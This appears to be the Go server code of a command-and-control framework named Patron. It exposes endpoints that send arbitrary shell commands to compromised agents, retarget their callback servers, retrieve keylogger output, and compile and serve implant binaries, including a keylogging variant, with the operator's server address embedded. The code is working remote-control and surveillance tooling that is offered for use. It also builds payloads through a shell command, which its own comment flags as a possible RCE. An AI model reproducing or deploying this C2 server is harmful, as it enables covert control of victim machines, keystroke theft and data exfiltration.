package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/PatronC2/Patron/data"
	"github.com/go-chi/chi/v5"
	"github.com/go-chi/cors"
	"github.com/google/uuid"
	"github.com/joho/godotenv"
	"github.com/qkgo/yin"
	"github.com/s-christian/gollehs/lib/logger"
)

func goDotEnvVariable(key string) string {

	// load .env file
	err := godotenv.Load(".env")

	if err != nil {
		log.Fatalf("Error loading .env file")
	}

	return os.Getenv(key)
}

func main() {

	publickey := goDotEnvVariable("PUBLIC_KEY")
	err := data.OpenDatabase()
	if err != nil {
		logger.Logf(logger.Info, "Error in DB\n")
		log.Fatalln(err)
	}
	r := chi.NewRouter()
	r.Use(yin.SimpleLogger)
	r.Use(cors.Handler(cors.Options{
		AllowedOrigins:   []string{"https://*", "http://*"},
		AllowCredentials: true,
	}))

	r.Get("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		res, _ := yin.Event(w, r)
		agents := data.Agents()
		res.SendJSON(agents)
	})

	r.Get("/api/oneagent/{agt}", func(w http.ResponseWriter, r *http.Request) {
		agentParam := chi.URLParam(r, "agt")
		res, _ := yin.Event(w, r)
		agent := data.FetchOne(agentParam)
		res.SendJSON(agent)
	})

	r.Get("/api/agent/{agt}", func(w http.ResponseWriter, r *http.Request) {
		agentParam := chi.URLParam(r, "agt")
		res, _ := yin.Event(w, r)
		agent := data.Agent(agentParam)
		res.SendJSON(agent)
	})

	r.Post("/api/agent/{agt}", func(w http.ResponseWriter, r *http.Request) {
		res, req := yin.Event(w, r)
		agentParam := chi.URLParam(r, "agt")
		newCmdID := uuid.New().String()
		body := map[string]string{}
		req.BindBody(&body)
		data.SendAgentCommand(agentParam, "0", "shell", body["command"], newCmdID) // from web
		// res.SendString(agentParam + "0" + "shell" + body["command"] + newCmdID)
		res.SendStatus(200)
	})

	r.Post("/api/updateagent/{agt}", func(w http.ResponseWriter, r *http.Request) {
		res, req := yin.Event(w, r)
		agentParam := chi.URLParam(r, "agt")
		newCmdID := uuid.New().String()
		body := map[string]string{}
		req.BindBody(&body)

		vsvr := regexp.MustCompile(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}[:](6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$`)
		vserver := vsvr.Match([]byte(body["callbackserver"]))
		vfrequency := regexp.MustCompile(`^\d{1,5}$`)
		vcallbackfrequency := vfrequency.Match([]byte(body["callbackfreq"]))
		vjitter := regexp.MustCompile(`^\d{1,5}$`)
		vcallbackjitter := vjitter.Match([]byte(body["callbackjitter"]))

		if !vserver {
			res.SendString("Invalid Server IP:Port")
		} else if !vcallbackfrequency {
			res.SendString("Invalid Callback Frequency, Max 99999")
		} else if !vcallbackjitter {
			res.SendString("Invalid Callback Jitter, Max 100")
		} else {

			data.UpdateAgentConfig(agentParam, body["callbackserver"], body["callbackfreq"], body["callbackjitter"])
			data.SendAgentCommand(agentParam, "0", "update", body["callbackfreq"]+":"+body["callbackjitter"], newCmdID) // from web
			// res.SendString(agentParam + "0" + "shell" + body["command"] + newCmdID)
			res.SendString("Success")
		}
	})

	r.Get("/api/keylog/{agt}", func(w http.ResponseWriter, r *http.Request) {
		agentParam := chi.URLParam(r, "agt")
		res, _ := yin.Event(w, r)
		agent := data.Keylog(agentParam)
		res.SendJSON(agent)
	})

	r.Get("/api/payloads", func(w http.ResponseWriter, r *http.Request) {
		res, _ := yin.Event(w, r)
		payloads := data.Payloads()
		res.SendJSON(payloads)
	})

	r.Post("/api/payload", func(w http.ResponseWriter, r *http.Request) {
		res, req := yin.Event(w, r)
		newPayID := uuid.New().String()
		body := map[string]string{}
		req.BindBody(&body)

		vnm := regexp.MustCompile(`^[a-zA-Z]{1,9}$`)
		vname := vnm.Match([]byte(body["name"]))
		vserverip, _ := regexp.MatchString(`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`, body["serverip"])
		vserverport, _ := regexp.MatchString(`^(6553[0-5]|655[0-2]\d|65[0-4]\d\d|6[0-4]\d{3}|[1-5]\d{4}|[1-9]\d{0,3}|0)$`, body["serverport"])
		vfrequency := regexp.MustCompile(`^\d{1,5}$`)
		vcallbackfrequency := vfrequency.Match([]byte(body["callbackfrequency"]))
		vjitter := regexp.MustCompile(`^\d{1,5}$`)
		vcallbackjitter := vjitter.Match([]byte(body["callbackjitter"]))

		if !vserverip {
			res.SendString("Invalid Server IP")
		} else if !vserverport {
			res.SendString("Invalid Server Port")
		} else if !vcallbackfrequency {
			res.SendString("Invalid Callback Frequency, Max 99999")
		} else if !vcallbackjitter {
			res.SendString("Invalid Callback Jitter, Max 100")
		} else if !vname {
			res.SendString("Invalid Name, [a-zA-Z]{1,9}")
		} else { // else if body["type"] != "original" || body["type"] != "wkeys" {
			// 	res.SendString("Invalid type")
			// }

			tag := strings.Split(newPayID, "-")
			concat := body["name"] + "_" + tag[0]
			var commandString string
			// Possible RCE concern
			if body["type"] == "original" {
				commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175

					"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o agents/%s client/client.go",
					body["serverip"],
					body["serverport"],
					body["callbackfrequency"],
					body["callbackjitter"],
					publickey,
					concat,
				)
			} else if body["type"] == "wkeys" {
				commandString = fmt.Sprintf( // Borrowed from https://github.com/s-christian/pwnts/blob/master/site/site.go#L175

					"CGO_ENABLED=0 go build -trimpath -ldflags \"-s -w -X main.ServerIP=%s -X main.ServerPort=%s -X main.CallbackFrequency=%s -X main.CallbackJitter=%s -X main.RootCert=%s\" -o agents/%s client/kclient/kclient.go",
					body["serverip"],
					body["serverport"],
					body["callbackfrequency"],
					body["callbackjitter"],
					publickey,
					concat,
				)
			}
			fmt.Println(commandString)
			err = exec.Command("sh", "-c", commandString).Run()
			if err != nil {
				res.SendStatus(500)
			}

			data.CreatePayload(newPayID, body["name"], body["description"], body["serverip"], body["serverport"], body["callbackfrequency"], body["callbackjitter"], concat) // from web
			res.SendString("Success")
		}
	})

	workDir, _ := os.Getwd()
	filesDir := http.Dir(filepath.Join(workDir, "agents"))
	FileServer(r, "/files", filesDir)

	http.ListenAndServe(":3001", r)
}

func FileServer(r chi.Router, path string, root http.FileSystem) {
	if strings.ContainsAny(path, "{}*") {
		panic("FileServer does not permit any URL parameters.")
	}

	if path != "/" && path[len(path)-1] != '/' {
		r.Get(path, http.RedirectHandler(path+"/", 301).ServeHTTP)
		path += "/"
	}
	path += "*"

	r.Get(path, func(w http.ResponseWriter, r *http.Request) {
		rctx := chi.RouteContext(r.Context())
		pathPrefix := strings.TrimSuffix(rctx.RoutePattern(), "/*")
		fs := http.StripPrefix(pathPrefix, http.FileServer(root))
		fs.ServeHTTP(w, r)
	})
}
